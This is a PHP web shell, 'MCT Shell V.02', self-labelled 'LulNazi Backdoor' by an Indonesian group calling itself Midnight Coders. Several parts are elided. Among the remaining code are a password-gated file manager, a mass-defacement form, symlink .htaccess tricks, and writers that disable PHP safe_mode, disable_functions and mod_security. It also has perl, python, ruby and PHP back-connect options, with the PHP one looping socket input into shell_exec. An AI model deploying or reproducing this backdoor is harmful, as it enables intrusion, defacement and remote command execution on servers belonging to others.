...
/* Configurasi */
$aupas 			= "2c2f46f8d85bdd80e60a0740504e31c7";// LulNazi
...
<html>
	<head>
		...
		<meta name="author" content="BAKADOX"/>
		<meta name="copyright" content="{ Midnight Coders }"/>
		<title>MCT Shell V.02</title>
		<link rel="icon" type="image/png" href="https://i.ibb.co/yPFYsLy/20200314-221837.jpg"/>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="#" class="text-muted fixed-bottom mb-3">Copyright 2020 @ { MidnightCoders}</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ Midnight Coders Team }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ Midnight Coders } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { MidnightCoders }</small>
		</div>
	</div><br/>';
	exit;
}
...
function chmodFile($dir,$file,$nfile){
	...
	if(isset($_POST['perm'])){
		if(@chmod($_GET['file'],$_POST['perm'])){
			echo '<font color="lime">Change Permission Berhasil Zi</font><br/>';
		}else{
			echo '<font color="white">Change Permission Gagal Zi :(</font><br/>';
		}
	}
	exit;
}
function buatFile($dir,$imgfile){
	...
	if (isset($_POST['bikin'])){
		...
		if ($buat){
			$swa = "success";
			$text = "Berhasil Membuat File Zi :)";
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal Membuat File Zi :(";
			swall($swa,$text,$dir);
		}
	}
}
...
function editFile($dir,$file,$nfile,$imgfile){
	...
	if(isset($_POST['edit_file'])){
		...
		if ($hasil){
			$swa = "success";
			$text = "Berhasil Update File Zi :)";
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal Update File Zi :(";
			swall($swa,$text,$dir);
		}
	}
}
...
function buatFolder($dir,$imgfol){
	...
	if (isset($_POST['buat'])){
		...
		foreach ($nama as $nama_folder){
			$folder = preg_replace("([^wsd-_~,;:[](].]|[.]{2,})", '', $nama_folder);
			$fd = @mkdir ($folder);
		}
		if ($fd){
			$swa = "success";
			$text = "Berhasil Membuat Folder Zi :)";
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal Membuat Folder Zi :(";
			swall($swa,$text,$dir);
		}
	}
}
function renameFolder($dir,$ndir,$imgfol){
	...
	if(isset($_POST['ganti'])){
		...
		if($ubah){
			$swa = "success";
			$text = "Berhasil Mengganti Nama Zi :)";
			$dir = dirname($dir);
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal Mengganti Nama Zi :(";
			$dir = dirname($dir);
			swall($swa,$text,$dir);
		}
	}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By LulNazi'></textarea><br/>
...
function sym404($dir,$file){
	...
	if($_POST['execute']){
		...
		@fwrite($inija,"ReadmeName ".$isi."nOptions Indexes FollowSymLinksnDirectoryIndex ids.htmlnAddType text/plain php html php5 phtmlnAddHandler text/plain php html php5 phtmlnSatisfy Any");
...
function bcTool($dir,$file){
	...
	if($_POST['bpl']){
		...
		sleep(1);
		echo "<pre class='text-light'>$outn".exe("ps aux | grep bp.pl")."</pre>";
		unlink("bp.pl");
	}
	if($_POST['backconnect'] == 'perl'){
		...
		sleep(1);
		echo "<pre class='text-light'>$outn".exe("ps aux | grep bc.pl")."</pre>";
		unlink("bc.pl");
	}
	if($_POST['backconnect'] == 'python'){
		...
		sleep(1);
		echo "<pre class='text-light'>$out1n".exe("ps aux | grep bcpyt.py")."</pre>";
		unlink("bcpyt.py");
	}
	if($_POST['backconnect'] == 'ruby'){
		...
		sleep(1);
		echo "<pre class='text-light'>$out2n".exe("ps aux | grep bcruby.rb")."</pre>";
		unlink("bcruby.rb");
	}
	if($_POST['backconnect'] == 'php'){
		...
		if($errno != 0){
			...
			fputs ($sockfd ,"
			n{#######################################}
			n..:: BackConnect PHP By Con7ext ::..
			n{#######################################}n");
			$dir = @shell_exec("pwd");
			$sysinfo = @shell_exec("uname -a");
			$time = @Shell_exec("time");
			$len = 1337;
			fputs($sockfd, "User ", $sysinfo, "connected @ ", $time, "nn");
			while(!feof($sockfd)){
				$cmdPrompt = '[kuda]#:> ';
				@fputs ($sockfd , $cmdPrompt );
				$command= fgets($sockfd, $len);
				@fputs($sockfd , "n" . @shell_exec($command) . "nn");
			}
			@fclose($sockfd);
		}
	}
...
function disabFunc($dir,$file){
	echo "<div class='card card-body text-center text-dark'>
		...
		if(isset($_POST['ini'])){
			...
			echo fwrite($file,"safe_mode = OFFndisable_functions = NONE");
			fclose($file);
			echo "<a href='php.ini' class='btn btn-success btn-block' target='_blank'>Klik Lul!</a>";
		}elseif(isset($_POST['htce'])){
			$file = fopen(".htaccess","w");
			echo fwrite($file,"<IfModule mod_security.c>nSecFilterEngine OffnSecFilterScanPOST Offn</IfModule>");
			fclose($file);
			...
			$byph = "safe_mode = OFFndisable_functions = NONE";
			$comp = "<Files *.php>nForceType application/x-httpd-php4n</Files>";
...
<html>
	<head>
		...
		<meta name="theme-color" content="#343a40"/>
		<meta name="author" content="LulNazi"/>
	...
	<body class="bg-dark text-light">
		...
		<style>
			...
			.about .card-body .img{
				position: relative;
				background: url(https://a.top4top.io/p_1758v4kab0.jpg);
		...
		<nav class="navbar static-top navbar-dark">
			...
			<div class="collapse navbar-collapse" id="info">
				<ul>
					<a href="https://facebook.com/amzah.su" class="lain"><i class="fa fa-facebook tambah"></i></a>
					<a href="https://www.instagram.com/amzah.su" class="lain"><i class="fa fa-instagram tambah"></i></a>
					<a href="https://www.youtube.com/channel/UChO0kbRsmIlR2fqp9D8DvPQ" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
					<a href="https://github.com/LulNazi666" class="lain"><i class="fa fa-github tambah"></i></a>
					<a href="https://amzah-ise.my.id" class="lain"><i class="fa fa-globe tambah"></i></a>
				</ul>
			</div>
		</nav>
		<?php
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/amzah.su" style="color:#ffffff;">{ MIDCODERS }</h1>
			<center><h5>LulNazi Backdoor</a></h5></center>
			<hr/>
			<div class="text-center">
				<div class="d-flex justify-content-center flex-wrap">
			...
			<div class="row">
				<div class="col-md-5"><br/>
					...
					<form>
						<input type="text" class="form-control" name="cmd" autocomplete="off" placeholder="id | uname -a | heked | lulnazi">
					</form>
					<hr/>
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://wa.me/6289653982239?text=hallo">Copyright 2019 [ LulNazi ]</a></center><br/>';	
